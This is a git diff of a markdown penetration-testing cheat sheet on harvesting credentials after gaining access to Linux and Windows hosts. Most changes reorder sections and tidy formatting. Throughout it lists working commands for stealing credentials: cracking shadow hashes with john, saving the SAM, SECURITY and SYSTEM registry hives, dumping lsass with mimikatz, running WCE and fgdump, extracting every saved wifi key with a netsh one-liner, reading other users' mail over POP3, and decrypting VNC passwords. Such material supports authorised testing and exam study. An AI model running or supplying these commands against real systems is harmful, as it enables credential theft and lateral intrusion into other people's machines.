@@ -18,23 +18,23 @@ john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 ```
 
 ### Old passwords in /etc/security/opasswd
-The `/etc/security/opasswd` file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.
+The `/etc/security/opasswd` file is used by pam_cracklib to keep the history of old passwords so that the user will not reuse them.
 
-Treat your opasswd file like your **/etc/shadow** file because it will end up containing user password hashes
+Treat `opasswd` file like **/etc/shadow** file because: it contains user password hashes.
 
-## Hashes in databases
+### Hashes in databases
 
 MySQL example:
 ```
 mysql -u root -p -h $ip
 use "Users"  
 show tables;  
-select \* from users;
+select * from users;
 ```
 
-## Passwords
+## Passwords
 
-### Files containing passwords
+### Files containing passwords
 ```
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
@@ -50,7 +50,7 @@ grep -rnw '/' -ie 'DB_USER' --color=always
 
 ## Interesting files
 
-### Find sensitive files
+### Find sensitive files
 ```
 find / -name *.txt
 find / -name *.zip
@@ -71,7 +71,7 @@ find / -name *password*
 /lib/live/config/0031-root-password
 ```
 
-### History
+### History files
 
 ```
 locate .bash_history
@@ -82,7 +82,7 @@ locate .php_history
 locate .viminfo
 ```
 
-### SSH
+### SSH files
 
 ```
 locate .ssh
@@ -142,7 +142,7 @@ find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 /var/spool/mail
 ```
 
-POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet:
+* **POP3 Enumeration** - Reading other peoples mail - how to check the mail using Telnet:
 ```
 root@kali:~# telnet $ip 110
  +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
@@ -168,7 +168,7 @@ root@kali:~# telnet $ip 110
  password: PA$$W0RD!Z
 ```
 
-## Sniff passwords
+## Sniff passwords
 
 ### TcpDump
 
@@ -205,17 +205,99 @@ hostname && whoami.exe && type proof.txt && ipconfig /all
 hostname && whoami.exe && type local.txt && ipconfig /all
 ```
 
+
+## Interesting files
+
+### Find sensitive files
+```
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+dir c:*vnc.ini /s /b
+dir c:*ultravnc.ini /s /b
+dir c:\ /s /b | findstr /si *vnc.ini
+```
+
+These are common files to find them in. They might be base64-encoded. So look out for that.
+```
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\unattend.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+```
+
+Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?
+```
+dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
+```
+```
+Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
+```
+
+### Search for a file with a certain filename
+```
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+dir /S /B *.txt == *.zip == *.doc == *.docx == *.rar == *.xls == *.sql == config*
+where /R C:\ user.txt
+where /R C:\ *.ini
+```
+
+### Logs & Sessions
+
+* **Apache / PHP logs**
+```
+c:\Program Files\Apache Group\Apache\logs\access.log  
+c:\Program Files\Apache Group\Apache\logs\error.log
+```
+
+```
+c:\WINDOWS\TEMP\  
+c:\php\sessions\  
+c:\php5\sessions\  
+c:\php4\sessions\
+```
+
+* **IIS Logs**
+```
+C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
+```
+
+* **Any Apache web logs**
+```
+dir /s access.log error.log
+```
+```
+Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
+```
+
 ## Hashes
 
 ### fgdump.exe
 
-We can use `fgdump.exe` (`locate fgdump.exe` on kali) to extract NTLM and LM Password hashes. Run it and there is a file called 127.0.0.1.pwndump where the hash is saved. Now you can try to brute force it. 
+We can use `fgdump.exe` (`locate fgdump.exe` on kali) to extract NTLM and LM Password hashes. A file called `127.0.0.1.pwndump` where the hash is saved.
 
 ### Windows Credencial Editor (WCE)
 
 WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE, one for 32 bit systems and one for 64 bit. So make sure you have the right one.
 
-You can run it like this
+You can run it like this:
 ```
 wce32.exe -w
 ```
@@ -224,32 +306,32 @@ wce32.exe -w
 
 ### Loot hives without tools
 
-This might be a better technique than using tools like wce and fgdump, since you don't have to upload any binaries. Get the registry:
+This might be a better technique than using tools like `wce` and `fgdump`, since you don't have to upload any binaries. Get the registry:
 ```
 C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
 C:\> reg.exe save hklm\security c:\windows\temp\security.save
 C:\> reg.exe save hklm\system c:\windows\temp\system.save
 ```
 
-The hashes can be extracted using `secretdump.py` or `pwdump`
+The hashes can be extracted using `secretdump.py` or `pwdump`.
 
 ### Dump cached credentials
 
 ```
-root@kali:~# cachedump
 usage: /usr/bin/cachedump <system hive> <security hive>
 ```
 
 ### Dump LSA secrets
 
 ```
-root@kali:~# lsadump
 usage: /usr/bin/lsadump <system hive> <security hive>
 ```
 
 Here, you will find account passwords for services that are set to run under actual Windows user accounts (as opposed to Local System, Network Service and Local Service), the auto-logon password and more.
 
 If the Windows host is part of a domain, you will find the domain credentials of the machine account with which you can authenticate to the domain to list domain users and admins as well as browsing shares and so on.
+
+**How to use credentials**
 
 Use [pth](http://code.google.com/p/passing-the-hash/) on Kali Linux or [wce](http://www.ampliasecurity.com/research/wcefaq.html) on your own Windows system to use these credentials.
 
@@ -309,19 +391,6 @@ Then dump the credentials offline using mimikatz and its minidump module:
 C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
 ```
 
-### Credential Manager
-
-When a user authenticates to a network share, a proxy, or uses a piece of client software and ticks the “Remember my password” box, the password is typically stored in an encrypted vault using the Windows Data Protection API. You can see every saved credential in the Credential Manager (accessed through User Accounts in the Control Panel), and you can dump them with [Network Password Recovery](http://www.nirsoft.net/utils/network_password_recovery.html). Remember to run the [64-bit version](http://www.nirsoft.net/utils/netpass-x64.zip) on a 64-bit Windows instances, or you won’t get them all.
-
-Sometimes, the user might have save his credentials in the memory while using “runas /savecred” option. We could check this by:
-```
-cmdkey /list
-dir C:\Users\username\AppData\Local\Microsoft\Credentials\
-dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
-Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-```
-
 ### Search for file contents
 
 ```
@@ -330,10 +399,6 @@ findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 findstr /si pass *.txt | *.xml | *.ini
 ```
-
-### Protected Storage
-
-Dump any passwords remembered in IE, Outlook or MSN using [Protected Storage PassView](http://www.nirsoft.net/utils/pspv.html)
 
 ### Passwords stored in services
 
@@ -344,10 +409,6 @@ Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
-
-### Third-party software
-
-NirSoft offers many [tools](http://nirsoft.net/utils/index.html#password_utils) to recover passwords stored by third-party software.
 
 ### Passwords in unattend.xml
 
@@ -377,7 +438,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
 ```
 
-### Search the registry for key names and passwords
+### Search the registry for key names and passwords
 
 ```
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
@@ -415,85 +476,26 @@ Oneliner method to extract wifi passwords from all the access point.
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
 ```
 
-## Interesting files
+### Credential Manager
 
-### Find sensitive files
+When a user authenticates to a network share, a proxy, or uses a piece of client software and ticks the “Remember my password” box, the password is typically stored in an encrypted vault using the Windows Data Protection API. You can see every saved credential in the Credential Manager (accessed through User Accounts in the Control Panel), and you can dump them with [Network Password Recovery](http://www.nirsoft.net/utils/network_password_recovery.html). Remember to run the [64-bit version](http://www.nirsoft.net/utils/netpass-x64.zip) on a 64-bit Windows instances!
+
+Sometimes, the user might have save his credentials in the memory while using “runas /savecred” option. We could check this by:
 ```
-%SYSTEMDRIVE%\pagefile.sys
-%WINDIR%\debug\NetSetup.log
-%WINDIR%\repair\sam
-%WINDIR%\repair\system
-%WINDIR%\repair\software, %WINDIR%\repair\security
-%WINDIR%\iis6.log
-%WINDIR%\system32\config\AppEvent.Evt
-%WINDIR%\system32\config\SecEvent.Evt
-%WINDIR%\system32\config\default.sav
-%WINDIR%\system32\config\security.sav
-%WINDIR%\system32\config\software.sav
-%WINDIR%\system32\config\system.sav
-%WINDIR%\system32\CCM\logs\*.log
-%USERPROFILE%\ntuser.dat
-%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
-%WINDIR%\System32\drivers\etc\hosts
-dir c:*vnc.ini /s /b
-dir c:*ultravnc.ini /s /b
-dir c:\ /s /b | findstr /si *vnc.ini
+cmdkey /list
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
 
-These are common files to find them in. They might be base64-encoded. So look out for that.
-```
-c:\sysprep.inf
-c:\sysprep\sysprep.xml
-c:\unattend.xml
-%WINDIR%\Panther\Unattend\Unattended.xml
-%WINDIR%\Panther\Unattended.xml
-```
+### Protected Storage
 
-Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?
-```
-dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
-```
-```
-Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
-```
+Dump any passwords remembered in IE, Outlook or MSN using [Protected Storage PassView](http://www.nirsoft.net/utils/pspv.html)
 
-### Search for a file with a certain filename
-```
-dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
-dir /S /B *.txt == *.zip == *.doc == *.docx == *.rar == *.xls == *.sql == config*
-where /R C:\ user.txt
-where /R C:\ *.ini
-```
+### Third-party software
 
-### Logs & Sessions
-
-```
-c:\Program Files\Apache Group\Apache\logs\access.log  
-c:\Program Files\Apache Group\Apache\logs\error.log
-```
-
-```
-c:\WINDOWS\TEMP\  
-c:\php\sessions\  
-c:\php5\sessions\  
-c:\php4\sessions\
-```
-
-IIS Logs:
-```
-C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
-C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
-C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
-C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
-```
-
-Any Apache web logs?:
-```
-dir /s access.log error.log
-```
-```
-Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
-```
+NirSoft offers many [tools](http://nirsoft.net/utils/index.html#password_utils) to recover passwords stored by third-party software.
 
 ## Misc
 
@@ -501,6 +503,11 @@ Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAct
 
 ```
 Net shares
+```
+
+### Decrypting VNC Password
+```
+wine vncpwdump.exe -k key
 ```
 
 ### Enumerate users and computers using powershell
@@ -525,11 +532,6 @@ Get-ADUser -Filter * -Properties *  | Select-Object @{Label = "Logon Name";Expre
                   @{Label = "Office";Expression = {$_.OfficeName}},  
                   @{Label = "Phone";Expression = {$_.telephoneNumber}},  
                   @{Label = "Email";Expression = {$_.Mail}}
-```
-
-### Decrypting VNC Password
-```
-wine vncpwdump.exe -k key
 ```
 
 ### Group Policy Preferences (GPP)
